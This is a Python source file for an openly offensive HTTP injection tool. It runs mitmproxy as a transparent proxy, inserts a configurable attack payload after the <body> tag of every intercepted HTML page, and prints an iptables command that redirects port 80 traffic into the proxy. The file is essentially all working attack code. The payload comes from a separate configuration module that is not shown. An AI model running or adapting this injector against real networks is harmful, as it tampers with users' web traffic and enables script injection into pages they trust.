#!/usr/bin/env python3
"""
HTTP Injection using mitmproxy - Alternative implementation using mitmproxy framework
More sophisticated HTTP handling with automatic encoding support
"""

import asyncio
from mitmproxy import http
from mitmproxy.tools.dump import DumpMaster
from mitmproxy.options import Options
import re
import signal
import sys

# Import centralized configuration
from config import AttackConfig, SecurityConfig

# Use configuration values
INJECTION_PAYLOAD = AttackConfig.INJECTION_PAYLOADS.get(
    AttackConfig.CURRENT_PAYLOAD,
    AttackConfig.INJECTION_CODE
)
ENABLE_HTTP_INJECTION = AttackConfig.ENABLE_HTTP_INJECTION
AUTO_CLEANUP = SecurityConfig.AUTO_CLEANUP

class HTTPInjector:
    def __init__(self):
        # Configuration from centralized config
        self.injection_payload = INJECTION_PAYLOAD.decode() if isinstance(INJECTION_PAYLOAD, bytes) else str(INJECTION_PAYLOAD)
        self.enable_injection = ENABLE_HTTP_INJECTION
        
        print(f"🔧 HTTP Injector initialized")
        print(f"   Injection enabled: {self.enable_injection}")
        print(f"   Payload: {self.injection_payload[:50]}...")

    def response(self, flow: http.HTTPFlow) -> None:
        """Process HTTP responses and inject payload if conditions are met"""
        if not self.enable_injection:
            return

        # Only process HTML content
        content_type = flow.response.headers.get("Content-Type", "")
        if "text/html" not in content_type.lower():
            return

        try:
            # Get HTML content (automatically handles gzip/deflate)
            html = flow.response.get_text()
            if not html:
                return
            
            # Find injection point (after <body> tag)
            body_match = re.search(r"(?i)<body[^>]*>", html)
            if body_match:
                insert_position = body_match.end()
                modified_html = html[:insert_position] + self.injection_payload + html[insert_position:]
            else:
                # Fallback: prepend to content
                modified_html = self.injection_payload + html

            # Update response content (automatically re-encodes)
            flow.response.set_text(modified_html)
            
            print(f"✅ Injected payload into {flow.request.pretty_host}{flow.request.path}")
            
        except Exception as e:
            print(f"❌ Error injecting payload: {e}")

def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    print("\n🛑 Shutting down HTTP injector...")
    if AUTO_CLEANUP:
        print("🧹 Cleanup completed")
    sys.exit(0)

def main():
    """Main function to run the HTTP injector"""
    print("🚀 Starting HTTP Injection with mitmproxy")
    print("=" * 50)
    
    # Setup signal handler
    signal.signal(signal.SIGINT, signal_handler)
    
    # Create HTTP injector addon
    injector = HTTPInjector()
    
    # Configure mitmproxy options
    opts = Options(
        listen_port=8080,  # Proxy port
        mode="transparent"  # Transparent proxy mode
    )
    
    try:
        # Create and run master
        master = DumpMaster(opts)
        master.addons.add(injector)
        
        print(f"🔧 Proxy listening on port 8080")
        print(f"💡 Configure iptables to redirect traffic:")
        print(f"   sudo iptables -t nat -A OUTPUT -p tcp --dport 80 -j REDIRECT --to-port 8080")
        print(f"🛑 Press Ctrl+C to stop")
        
        asyncio.run(master.run())
        
    except KeyboardInterrupt:
        signal_handler(None, None)
    except Exception as e:
        print(f"❌ Error running proxy: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
